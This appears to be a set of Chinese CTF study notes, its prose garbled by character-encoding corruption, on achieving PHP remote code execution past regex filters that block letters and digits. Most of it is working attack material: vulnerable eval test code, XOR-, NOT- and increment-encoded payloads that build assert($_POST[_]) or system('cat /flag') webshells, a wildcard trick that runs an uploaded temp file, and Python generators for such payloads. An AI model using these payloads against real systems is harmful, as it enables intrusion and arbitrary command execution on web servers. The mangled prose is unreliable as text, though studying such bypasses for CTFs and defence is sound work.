ç‰ˆæœ¬ä¸ºphp5

 

php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡`$f='assert';$f(...);`è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚

 

ä½†php7ä¸­ï¼Œassertä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼evalï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥åˆ©ç”¨èµ·æ¥ç¨å¾®å¤æ‚ä¸€ç‚¹ã€‚ä½†ä¹Ÿæ— éœ€è¿‡äºæ‹…å¿ƒï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨file_put_contentså‡½æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨æ¥getshellã€‚

 

# **æ— æ•°å­—å’Œå­—æ¯rce**

 

æµ‹è¯•ä»£ç 

 

```
<?php

if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {

 eval($_GET['shell']);

}
```

 

```
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);
```

åœ¨è¿™é‡Œé¢ç»è¿‡urlç¼–ç çš„å­—ç¬¦èƒ½å¤Ÿç»•è¿‡

æ‰€ä»¥%01è¿™äº›ä¸ä¼šè¢«åŒ¹é…

 

```
<?php

$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');//$_='assert';

$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';

$___=$$__;

$_($___[_]); //æ‰€æœ‰çš„åˆèµ·æ¥å°±æ˜¯ assert($_POST[_]);

 
```

payload

 

```
http://127.0.0.1/test/p.php?shell=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);
```

 

è¿˜è¦postä¸€ä¸ªå‚æ•°

_=phpinfo();

![image-20210808135044128](images/1.png)

 

 

åŒç†

```
_=print_r(scandir('/'));å¯ä»¥ç›´æ¥è·å–æ ¹ç›®å½•äº†

_=print_r(scandir(getcwd()));

```

 

 

å‚è€ƒé“¾æ¥:https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

 

 

å¯¹äºlinuxä¸­çš„shellæ˜¯æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼çš„ï¼Œå½“ä½ å¿˜è®°æŸäº›å­—ç¬¦æ—¶å¯ä»¥é€šè¿‡? % *æ¥ä»£æ›¿

æ‰€ä»¥æˆ‘ä»¬è¦æ‰§è¡Œä¸€ä¸ªå‘½ä»¤çš„è¯å¯ä»¥ç›´æ¥ç”¨?æ›¿ä»£

è€Œä¸”å¤§å¤šæ•°æœåŠ¡å™¨éƒ½æ˜¯ç”¨çš„linux

ç›´æ¥åœ¨kalié‡Œé¢å®éªŒäº†

 

ä¸è¿‡ç”¨è¿™ç§æ–¹æ³•rce çš„è¯éœ€è¦ä¸Šä¼ ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶

```
<!DOCTYPE html>

<html lang="en">

<head>

Â Â Â Â <meta charset="UTF-8">

Â Â Â Â <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>POSTæ•°æ®åŒ…POC</title>

</head>

<body>

<form action="http://" method="post" enctype="multipart/form-data">

<!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥-->

  <label for="file">æ–‡ä»¶åï¼š</label>

  <input type="file" name="file" id="file"><br>

  <input type="submit" name="submit" value="æäº¤">

</form>

</body>

</html>
```

 

åœ¨è¿™ä¸ªæ–‡ä»¶ä¸‹å†™å…¥éœ€è¦è°ƒç”¨çš„å‘½ä»¤

```
#!/bin/sh

ls
```

æ„æ€æ˜¯è°ƒç”¨lså‘½ä»¤

å½“ç„¶è‚¯å®šè¿˜æ˜¯è¦å…ˆè·å–æ–‡ä»¶å†…å®¹æˆ‘ä»¬é»˜è®¤ä¸Šä¼ çš„æ–‡ä»¶ä¼šä¿å­˜åœ¨/tmpç›®å½•ä¸‹

å‘½åä¸º/tmp/phpxxxxxx

åˆ©ç”¨``å†…$ä¼šè§£æçš„ç‰¹æ€§,é€šè¿‡ä½è¿ç®—,æ‰§è¡Œç³»ç»Ÿå‘½ä»¤

`[@-[]`æ˜¯linuxä¸‹é¢çš„åŒ¹é…ç¬¦ï¼Œæ˜¯è¿›è¡ŒåŒ¹é…çš„å¤§å†™å­—æ¯ã€‚

æ‰€ä»¥

```
shell=?><?=`. /???/????????[@-[]`;?>
```

 ç”¨+ä»£æ›¿ç©ºæ ¼ç»•è¿‡

![image-20210526181234816](images/2.png)

æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶å†…å®¹å°±å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œäº†

ä¸è¿‡ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰æ—¶å€™æœ‰æœ‰æ—¶å€™æ²¡æœ‰,è®°å¾—å¤šåˆ·æ–°å‡ æ¬¡

 

å‚è€ƒé“¾æ¥:https://www.freebuf.com/articles/web/186298.html

 

# **æ— å­—æ¯rce**

 

æµ‹è¯•ä»£ç 

```
 
<?php

show_source(__FILE__);

$mess=$_POST['mess'];

if(preg_match("/[a-zA-Z]/",$mess)){

  die("invalid input!");

}

eval($mess);
```

 

![image-20210808134559028](images/3.png)

è¯»å–åˆ°äº†å½“å‰åŒä¸€ä¸ªç›®å½•ä¸‹çš„p.php

```
mess=?><?=$_="3317!315288"^"@[^@~@^@@[]";$_(("0"^"@").(".").("030"^"@[@"));
```

è¿™ä¸²å­—ç¬¦ä¸²çš„æ„æ€æ˜¯show_source(p.php)

ä¸è¿‡æ˜¯éœ€è¦å¼‚æˆ–è¿ç®—å

è¿™é‡Œæœ‰ä¸ªå¼‚æˆ–è¿ç®—è„šæœ¬

 

```
valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "

answer = "show_source"

tmp1, tmp2 = '', ''
for c in answer:
  for i in valid:
    for j in valid:
      if (ord(i) ^ ord(j) == ord(c)):
        tmp1 += i
        tmp2 += j
        break
    else:
      continue
    break
print(tmp1, tmp2)
```

é™¤æ­¤ä¹‹å¤–ä¹Ÿå¯ä»¥ç”¨ä¸Šé¢çš„æ–¹æ³•

Url:

```
http://127.0.0.1/test/p.php?shell=$_=(''^'').(''^'').(''^'');$__='_'.(' '^']').('%2F'^'`').(''^']').('	'^']');$___=$$__;$_($___[_]);
```

 

postæ•°æ®:

```
mess=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);&_=phpinfo();
```

å½“ç„¶æˆ‘è‚¯å®šå…ˆç”¨glob()çœ‹çœ‹å½“å‰ç›®å½•æœ‰ä»€ä¹ˆä¸œè¥¿

![image-20210808140427356](images/4.png)

ç©¿è¶Šåˆ°ä¸Šçº§ç›®å½•å°±ç”¨../

![image-20210808140352943](images/5.png)

```
mess=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);&_=print_r(show_source('p.php'));
```

![image-20210808140549044](images/6.png)



```
æ€è·¯ä¸€ï¼šç»•è¿‡å­—ç¬¦å’Œæ•°å­—
code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
1.æˆåŠŸ preg_match("/[A-Za-z0-9]+/",$code)
2.å¤±è´¥ preg_match("/[A-Za-z0-9_@]+/",$code)
3.å¤±è´¥ preg_match("/[A-Za-z0-9_$@]+/",$code)

æ€è·¯äºŒï¼šç»•è¿‡å­—ç¬¦å’Œæ•°å­—+ä¸‹åˆ’çº¿ï¼ˆå˜é‡_å’Œ__ï¼‰
code=${"`{{{"^"?<>/"}['+']();
1.æˆåŠŸ preg_match("/[A-Za-z0-9]+/",$code)
2.æˆåŠŸ preg_match("/[A-Za-z0-9_@]+/",$code)
3.å¤±è´¥ preg_match("/[A-Za-z0-9_$@]+/",$code)
- ?code=${"`{{{"^"?<>/"}['+']();&+=getFlag
- ?code=${"`{{{"^"?<>/"}['+']();&_=assert&__=print_r(`scandir`('/'))

æ€è·¯ä¸‰ï¼šç»•è¿‡å­—ç¬¦å’Œæ•°å­—+ä¸‹åˆ’çº¿ï¼ˆå˜é‡_å’Œ__ï¼‰+ç¾å…ƒç¬¦å·ï¼ˆ$ï¼‰
1.å‡å¤±è´¥

------------------------------------------------------

ã€æœ€ç»ˆç­”æ¡ˆã€‘
æ€è·¯å››ï¼šé‡‡ç”¨é€šé…ç¬¦ç»•è¿‡ç¾å…ƒç¬¦å·ï¼ˆ$ï¼‰
?code=?><?=`/???/??? /????`?>
?code=?%3E%3C?=`/???/???%20/????`?%3E

Cflag{h76ghpt2v2JiYEKzBQ5ysxu9b2Z3mN4A} 
```

å–åç»•è¿‡:

```
<?php
$a = "system";
$b= "cat /flllllaaaaaaggggggg";
echo urlencode(~$a);
echo "\n";
echo urlencode(~$b);
```

payloadè¿˜è¦åŠ ä¸Šå–å

```
?shell=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);
```

```
$_=[];$_=@"$_";$_=$_["!"=="@"];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```



```
$_=[];$_="$_";$_=$_[1==1];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```



```
$_=
[];$_=@"$_";$_=$_["!"=="@"];$___=$_;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$___.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$____='_';$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$_=$$____;$___($_[_]);
```

å›½å¤–æŸæ¯”èµ›é€šè¿‡å¼‚æˆ–rce

https://ljdd520.github.io/2021/01/28/TetCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/

è„šæœ¬å¦‚ä¸‹

```
import urllib.parse

class WebShell(object):
    def __init__(self, chars, payload):
        self.chars = chars
        self.payload = payload
        self.dic = self.shell()

    def shell(self):
        dic = {}
        for i in range(0, len(self.chars)):
            for j in range(0, len(self.chars)):
                for k in range(0, len(self.chars)):
                    temp = self.chars[i] + self.chars[j] + self.chars[k]
                    result = chr(ord(self.chars[i]) ^ ord(self.chars[j]) ^ ord(self.chars[k]))
                    dic[temp] = result
        return dic

    def get_shell(self):
        str1 = ''
        str2 = ''
        str3 = ''
        for i in range(0, len(self.payload)):
            for j in self.dic:
                if self.dic[j] == self.payload[i]:
                    str1 = str1 + j[0]
                    str2 = str2 + j[1]
                    str3 = str3 + j[2]
                    break

        result = '\'' + str1 + '\'' + '^' + '\'' + str2 + '\'' + '^' + '\'' + str3 + '\''
        return result

    def url_encode_shell(self):
        return urllib.parse.quote(self.get_shell())

    def url_decode_shell(self):
        return urllib.parse.unquote(self.url_encode_shell())


if __name__ == '__main__':
    chars = r"0123456789+-*/().~^|&"
    payload = r"eval($_GET[1])"
    webShell = WebShell(chars, payload)
    result = webShell.get_shell()
    print(result)
    print(webShell.url_encode_shell())
    print(webShell.url_decode_shell())

"""
'00040000020000'^'+8-~021)+85030'^'~~|&(&^^^^^1^)'
%2700040000020000%27%5E%27%2B8-~021%29%2B85030%27%5E%27~~%7C%26%28%26%5E%5E%5E%5E%5E1%5E%29%27
'00040000020000'^'+8-~021)+85030'^'~~|&(&^^^^^1^)'
"""
```

